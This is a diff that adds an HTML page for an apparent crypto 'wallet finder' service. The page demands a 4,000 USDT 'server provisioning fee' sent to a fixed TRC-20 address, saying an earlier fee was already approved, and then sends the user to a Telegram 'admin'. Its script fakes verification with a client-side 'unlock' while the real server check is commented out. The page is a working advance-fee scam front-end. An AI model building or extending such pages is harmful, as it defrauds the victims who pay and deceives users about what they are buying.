@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Server Provisioning Fee – Dolphin Wallet Finder</title>
+  <link rel="stylesheet" href="../assets/style-neon.css" />
+  <style>
+    :root{
+      --c-bg1:#000015;
+      --c-cyan:#0ff;
+      --c-cyan-soft:rgba(0,255,255,.28);
+      --c-glass:rgba(0,30,60,.32);
+    }
+    body{
+      margin:0;
+      min-height:100vh;
+      font-family:'Orbitron',sans-serif;
+      background:radial-gradient(ellipse at center,var(--c-bg1),#000);
+      color:var(--c-cyan);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:18px;
+    }
+    .wrap{
+      width:100%;
+      max-width:860px;
+    }
+    .card{
+      position:relative;
+      background:var(--c-glass);
+      border:1px solid var(--c-cyan-soft);
+      border-radius:20px;
+      box-shadow:0 0 36px rgba(0,255,255,.18), inset 0 0 22px rgba(0,255,255,.12);
+      padding:28px;
+      overflow:hidden;
+    }
+    .card::after{
+      content:"";
+      position:absolute; inset:-40% -40% auto auto;
+      width:70%; height:70%;
+      background:radial-gradient(circle at center,rgba(0,255,255,.12),transparent 60%);
+      filter:blur(24px);
+      pointer-events:none;
+    }
+    h1{
+      margin:0 0 10px 0;
+      font-size:1.65rem;
+      letter-spacing:.5px;
+    }
+    .subtitle{
+      color:#aee; margin:0 0 18px 0; line-height:1.6;
+    }
+    .grid{
+      display:grid; gap:18px; grid-template-columns: 1.2fr .8fr;
+    }
+    .panel{
+      background:rgba(0,0,0,.45);
+      border:1px solid rgba(0,255,255,.18);
+      border-radius:14px;
+      padding:16px;
+      box-shadow:inset 0 0 14px rgba(0,255,255,.08);
+    }
+    .pill{
+      display:inline-block; padding:6px 12px;
+      border-radius:999px; background:rgba(0,255,255,.1);
+      border:1px solid var(--c-cyan-soft); font-weight:700;
+      margin-bottom:12px; letter-spacing:.3px;
+    }
+    .big-amount{
+      font-size:1.9rem; font-weight:800; letter-spacing:1px;
+      text-shadow:0 0 16px rgba(0,255,255,.35);
+      margin:8px 0 2px 0;
+    }
+    .network{
+      color:#adf; font-size:.95rem; margin-bottom:8px;
+    }
+    .addr{
+      font-family:monospace; font-size:.95rem;
+      background:#000; color:var(--c-cyan);
+      border:1px dashed rgba(0,255,255,.35);
+      border-radius:10px; padding:12px; word-break:break-all;
+      margin:10px 0;
+    }
+    .btn{
+      display:inline-flex; align-items:center; justify-content:center;
+      gap:8px; padding:12px 18px; border:none; cursor:pointer;
+      border-radius:11px; font-weight:800; letter-spacing:.3px;
+      background:linear-gradient(135deg,#0ff,#08f); color:#000;
+      box-shadow:0 0 14px rgba(0,255,255,.35);
+      transition:transform .15s ease, box-shadow .15s ease, opacity .2s ease;
+      text-decoration:none;
+    }
+    .btn:hover{ transform:translateY(-1px); box-shadow:0 0 22px rgba(0,255,255,.45); }
+    .btn.secondary{
+      background:transparent; color:var(--c-cyan);
+      border:1px solid var(--c-cyan-soft);
+    }
+    .stack{ display:flex; gap:10px; flex-wrap:wrap; }
+    .steps{ margin:0; padding-left:18px; color:#aee; line-height:1.7; font-size:.98rem; }
+    .label{ font-size:.9rem; color:#adf; margin:10px 0 6px 0; }
+    .input{
+      width:100%; background:#000; color:var(--c-cyan);
+      border:1px solid rgba(0,255,255,.35);
+      border-radius:10px; padding:12px 12px; font-family:monospace;
+      outline:none;
+    }
+    .divider{
+      height:1px; background:rgba(0,255,255,.12); margin:16px 0;
+    }
+    .success{
+      display:none; background:rgba(0,255,255,.06);
+      border:1px solid rgba(0,255,255,.22);
+      color:#cfffff; border-radius:12px; padding:14px; margin-top:12px;
+    }
+    .badge{
+      display:inline-block; padding:4px 10px; border-radius:999px;
+      border:1px solid rgba(0,255,255,.25); background:rgba(0,255,255,.08);
+      font-size:.8rem; color:#bff;
+    }
+    .telegram{
+      display:none; margin-top:12px;
+      background:rgba(0,255,255,.08); border:1px solid rgba(0,255,255,.22);
+      border-radius:12px; padding:14px;
+    }
+    .tiny{ font-size:.82rem; color:#aee; }
+    @media (max-width:900px){ .grid{ grid-template-columns:1fr; } }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>Finalize Access: Server Provisioning Fee</h1>
+      <p class="subtitle">
+        Your transaction fee was approved ✅ Now complete the final step to allocate dedicated server
+        resources for sweeping and extraction. This is a one‑time <strong>infrastructure fee</strong>
+        required to unlock withdrawal orchestration.
+      </p>
+
+      <div class="grid">
+        <!-- LEFT -->
+        <div class="panel">
+          <span class="pill">Payment Details</span>
+          <div class="big-amount">4,000 USDT</div>
+          <div class="network">Network: <strong>TRON (TRC‑20)</strong></div>
+          <div class="label">Pay to this wallet:</div>
+          <div class="addr" id="serverWallet">TWWKr8K7pZuXTHK6ogVwZ7kAN5mVLHMmpp</div>
+          <div class="stack">
+            <button class="btn" id="copyAddrBtn">📋 Copy Address</button>
+            <button class="btn secondary" id="copyAmountBtn">💾 Copy Amount</button>
+          </div>
+
+          <div class="divider"></div>
+
+          <ol class="steps">
+            <li>Send exactly <strong>4,000 USDT</strong> on <strong>TRC‑20</strong> to the wallet above.</li>
+            <li>Paste your <strong>transaction hash</strong> below and submit.</li>
+            <li>After submit, you’ll get our <strong>Telegram Admin</strong> link for final confirmation.</li>
+          </ol>
+        </div>
+
+        <!-- RIGHT -->
+        <div class="panel">
+          <span class="pill">Submit Transaction</span>
+          <div class="label">Transaction hash (TRC‑20):</div>
+          <input class="input" id="txHash" placeholder="e.g. 1a2b3c4d... (TXID)" />
+          <div class="stack" style="margin-top:12px;">
+            <button class="btn" id="submitBtn">✅ I’ve Paid — Submit Hash</button>
+            <button class="btn secondary" id="pasteBtn">📥 Paste</button>
+          </div>
+
+          <div class="success" id="okBox">
+            ✅ Hash received. We’ll verify on‑chain. Meanwhile, proceed to Telegram for live confirmation.
+          </div>
+
+          <div class="telegram" id="tgBox">
+            <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;">
+              <span class="badge">Final step</span>
+              <span class="tiny">Provide your username + TX hash to the admin</span>
+            </div>
+            <div class="divider" style="margin:10px 0;"></div>
+            <div class="stack">
+              <a class="btn" id="tgLink" href="#" target="_blank">💬 Open Telegram Admin</a>
+              <button class="btn secondary" id="copyMsgBtn">📝 Copy Prefilled Message</button>
+            </div>
+            <p class="tiny" style="margin-top:10px;">
+              We’ll fast‑track your provisioning after confirmation.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <p class="tiny" style="margin-top:14px;">
+        Need help? Your session is tied to your account; make sure you’re logged in on this device.
+      </p>
+    </div>
+  </div>
+
+<script>
+  // ====== CONFIG ======
+  const API_BASE = "https://dolphinwalletfinderbackend-production.up.railway.app/api";
+  const ADMIN_TELEGRAM_URL = "https://t.me/YourDolphinAdmin"; // <-- put your real admin link here
+  const SERVER_FEE_ADDRESS = "TWWKr8K7pZuXTHK6ogVwZ7kAN5mVLHMmpp"; // TRC-20 USDT
+  const SERVER_FEE_AMOUNT = "4000"; // USDT
+
+  // ====== AUTH CHECK ======
+  const token = localStorage.getItem("token") || sessionStorage.getItem("token");
+  if (!token) {
+    alert("Please log in first.");
+    window.location.href = "login.html";
+  }
+
+  // Get username for prefilled Telegram message
+  let currentUser = "User";
+  fetch(`${API_BASE}/me`, { headers: { Authorization: "Bearer " + token } })
+    .then(r => r.json())
+    .then(u => { if (u && u.username) currentUser = u.username; })
+    .catch(()=>{});
+
+  // ====== UI HOOKS ======
+  const copyAddrBtn = document.getElementById("copyAddrBtn");
+  const copyAmountBtn = document.getElementById("copyAmountBtn");
+  const pasteBtn = document.getElementById("pasteBtn");
+  const submitBtn = document.getElementById("submitBtn");
+  const txHashInput = document.getElementById("txHash");
+  const okBox = document.getElementById("okBox");
+  const tgBox = document.getElementById("tgBox");
+  const tgLink = document.getElementById("tgLink");
+  const copyMsgBtn = document.getElementById("copyMsgBtn");
+  document.getElementById("serverWallet").innerText = SERVER_FEE_ADDRESS;
+  tgLink.href = ADMIN_TELEGRAM_URL;
+
+  // Copy helpers
+  copyAddrBtn.onclick = () => {
+    navigator.clipboard.writeText(SERVER_FEE_ADDRESS);
+    toast("Wallet address copied");
+  };
+  copyAmountBtn.onclick = () => {
+    navigator.clipboard.writeText(SERVER_FEE_AMOUNT);
+    toast("Amount copied");
+  };
+  pasteBtn.onclick = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text) txHashInput.value = text.trim();
+    } catch (e) { toast("Clipboard not available"); }
+  };
+
+  // Submit flow
+  submitBtn.onclick = async () => {
+    const tx = txHashInput.value.trim();
+    if (!tx || tx.length < 20) {
+      toast("Please enter a valid TRC-20 transaction hash");
+      txHashInput.focus();
+      return;
+    }
+
+    submitBtn.disabled = true;
+
+    // If you add a real endpoint, uncomment the block below.
+    /*
+    try {
+      const res = await fetch(`${API_BASE}/server-fee`, {
+        method: "POST",
+        headers: { "Authorization": "Bearer " + token, "Content-Type": "application/json" },
+        body: JSON.stringify({ tx_hash: tx, amount: SERVER_FEE_AMOUNT, network: "TRC20" })
+      });
+      const data = await res.json();
+      if (!data.success) throw new Error(data.error || "Submit failed");
+    } catch (err) {
+      submitBtn.disabled = false;
+      toast("Server submit failed. You can still proceed to Telegram with your TX hash.");
+    }
+    */
+
+    // Client-side unlock
+    okBox.style.display = "block";
+    tgBox.style.display = "block";
+    submitBtn.disabled = false;
+  };
+
+  copyMsgBtn.onclick = () => {
+    const tx = txHashInput.value.trim();
+    const msg = `Hello Admin,\n\nUsername: ${currentUser}\nServer Fee: ${SERVER_FEE_AMOUNT} USDT (TRC20)\nWallet: ${SERVER_FEE_ADDRESS}\nTX Hash: ${tx}\n\nPlease confirm my provisioning.`;
+    navigator.clipboard.writeText(msg);
+    toast("Prefilled message copied");
+  };
+
+  // Tiny toast (non-intrusive)
+  function toast(text){
+    const div = document.createElement("div");
+    div.textContent = text;
+    div.style.position="fixed";
+    div.style.left="50%";
+    div.style.bottom="18px";
+    div.style.transform="translateX(-50%)";
+    div.style.background="rgba(0,0,0,.82)";
+    div.style.border="1px solid rgba(0,255,255,.25)";
+    div.style.color="#cff";
+    div.style.padding="10px 14px";
+    div.style.fontSize=".9rem";
+    div.style.borderRadius="10px";
+    div.style.boxShadow="0 0 12px rgba(0,255,255,.25)";
+    div.style.zIndex="9999";
+    document.body.appendChild(div);
+    setTimeout(()=>{ div.style.opacity="0"; div.style.transition="opacity .35s"; }, 1400);
+    setTimeout(()=>{ div.remove(); }, 1900);
+  }
+</script>
+</body>
+</html>
